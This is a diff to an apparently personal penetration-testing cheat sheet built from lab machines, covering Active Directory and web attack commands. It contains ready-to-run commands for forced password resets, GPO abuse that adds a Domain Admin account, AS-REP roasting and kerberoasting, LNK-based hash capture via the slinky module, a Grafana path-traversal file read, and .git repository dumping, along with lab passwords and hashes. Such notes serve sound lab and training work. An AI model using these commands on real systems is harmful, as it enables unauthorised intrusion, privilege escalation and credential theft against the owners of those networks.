@@ -238,13 +238,13 @@ impacket-rbcd resourced.local/l.livingstone -hashes :19a3a7550ce8c505c2d46b5e39d
 - can change the target password
 
 ```bash
-net rpc password 'michael' 'Password1!' -U administrator.htb/olivia%ichliebedich -S 10.129.5.216
+net rpc password '$TARGET_USER' '$NEW_PW' -U administrator.htb/olivia%ichliebedich -S 10.129.5.216
 ```
 
 ### ForceChangePassword
 
 ```bash
-net rpc password 'benjamin' 'Password1!' -U administrator.htb/michael%'Password1!' -S 10.129.5.216
+net rpc password '$TARGET_USER' '$NEW_PW' -U administrator.htb/michael%'Password1!' -S 10.129.5.216
 ```
 
 ### GenericWrite
@@ -259,25 +259,33 @@ python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iET
 
 ![bloodhound](/images/vault/vault-bloodhound.png)
 
-- make the user (anirudh) owner of the policy.
+1. make the user (anirudh) owner of the policy.
 
 ```sh
 impacket-owneredit -action write -new-owner 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC' 'vault'/'anirudh':'SecureHM'
 ```
 
-- give all privileges to the user
+2. give all privileges to the user
 
 ```sh
 impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'anirudh' -target-dn 'CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC' 'vault'/'anirudh':'SecureHM' -dc-ip 192.168.115.172
 ```
 
-- Add the user to local admin using SharpGPOAbuse.exe
+3. Add the user to local admin using SharpGPOAbuse.exe
 
 ```powershell
 .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
 ```
 
-- Update the policy
+- Can be done from linux as well. Add a domain user and add to the domain admin group.
+
+Use the CN for `-gpo-id` option.
+
+```bash
+python3 pygpoabuse.py sysco.local/greg.shields:'5y5coSmarter2025!!!' -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -taskname SecurityUpdate  -dc-ip 10.1.126.37 -command 'net user UserGPO P@ssw0rd /add && net group "Domain Admins" UserGPO /add' -filter-enabled -target-dns-name dc01.sysco.local
+```
+
+4. Update the policy from target machine.
 
 ```powershell
 gpupdate /force
@@ -380,6 +388,38 @@ nxc ldap hutch.offsec -u '' -p '' --query "(sAMAccountName=*)" "" | grep sAMAcco
 nxc ldap hutch.offsec -u '' -p '' --query "(sAMAccountName=*)" "" | grep description   
 ```
 
+- make a userlist
+
+```sh
+nxc ldap 10.1.200.19 -u 'bob.ross' -p '137Password123!@#' --users-export sw-users.txt
+```
+
+- asrep roasting
+
+```bash
+nxc ldap 10.1.200.19 -u 'bob.ross' -p '137Password123!@#' --asreproast sw-asrep.txt
+```
+
+- kerberoasting
+
+```sh
+nxc ldap 10.1.200.19 -u 'bob.ross' -p '137Password123!@#' --kerberoasting sw-kerb.txt
+```
+
+### smb
+
+#### slinky
+
+- When a user has write permission on share
+
+1. set up responder 
+
+2. use slinky moudle. Automatically make a lnk file and locate it in a writable share
+
+```sh
+nxc smb 10.1.200.19 -u '' -p '' -d hack.smarter -M slinky -o NAME=documents SERVER=10.200.78.180
+```
+
 ## ldapsearch
 
 - make a user list
@@ -392,6 +432,20 @@ ldapsearch -x -H ldap://10.129.234.71 -b "dc=baby,dc=vl" | grep -i samaccountnam
 
 ```bash
 ldapsearch -x -b "dc=baby,dc=vl" "*" -H ldap://BabyDC.baby.vl
+```
+
+## SMB
+
+### smbpasswd
+
+- when SMB error message says "user must change password"
+
+```sh
+smbpasswd -r 192.168.121.123 -U testuser
+Old SMB password:
+New SMB password:
+Retype new SMB password:
+Password changed for user testuser
 ```
 
 ## webdav
@@ -505,20 +559,6 @@ impacket-net ignite.local/administrator@dc.ignite.local -k -no-pass user
 
 `impacket-secretsdump NIX01/Administrator:'mdm0axd*EQM7xmq.krn'@10.129.101.210`
 
-## SMB
-
-### smbpasswd
-
-- when SMB error message says "user must change password"
-
-```sh
-smbpasswd -r 192.168.121.123 -U testuser
-Old SMB password:
-New SMB password:
-Retype new SMB password:
-Password changed for user testuser
-```
-
 ## mysql
 
 ### windows
@@ -536,7 +576,7 @@ Get domain information remotely.
 Domain user account needed.
 
 ```sh
-sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns $DC -c all 
+sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns $DC -c all --zip
 ```
 
 ### plumhound
@@ -551,7 +591,9 @@ neo4j, bloodhound must be running.
 	3. sudo python3 PlumHound.py -x tasks/default.tasks -p {neo4j password}  (write a report)
 ```
 
-## git
+## WEB
+
+### git clone
 
 - git clone with authorized token
 
@@ -567,10 +609,26 @@ git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ell
 pip install git-dumper
 ```
 
-> even browser access to `/.git` is forbidden, it can still dump the repository
+> even browser access to `/.git` is forbidden, it may still dump the repository
 
 ```
 git-dumper http://bullybox.local/.git/ bullybox/
+```
+
+### Joomla
+
+When target web service using joomla
+
+```bash
+joomscan -u http://samurai.hsm
+```
+
+### curl
+
+- LFI examples
+
+```bash
+curl --path-as-is "http://192.168.202.181:3000/public/plugins/prometheus/../../../../../../../../../var/lib/grafana/grafana.db" --output grafana.db
 ```
 
 ## evilwin-rm
@@ -705,14 +763,6 @@ impacket-secretsdump dc01.shadow.gate/'dc01$':@10.0.26.64 -hashes :a45d38d937559
 
 ![systemd](/images/hetemit/systemd.png)
 
-## curl
-
-- LFI examples
-
-```bash
-curl --path-as-is "http://192.168.202.181:3000/public/plugins/prometheus/../../../../../../../../../var/lib/grafana/grafana.db" --output grafana.db
-```
-
 ## Linux Group
 
 ### disk group
@@ -792,3 +842,31 @@ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 `sudo hexedit $file`
 
 - save : crtl+x
+
+## NFS
+
+- check the share
+
+`showmount -e 10.1.156.207`
+
+```
+/srv/nfs/user1 *
+```
+
+- mount to kali machine
+
+```bash
+sudo mount -t nfs 10.1.156.207:/srv/nfs/user1 ./mnt/ -o nolock
+```
+
+## Username-anarchy
+
+- Collect usernames from web server or any other sources and make a user list.
+
+- Input the user list to make combination of potential usernames
+
+```
+sudo ~/Tools/username-anarchy/username-anarchy --input-file users.txt >> users.txt
+```
+
+**The result can be used for asrep roasting**
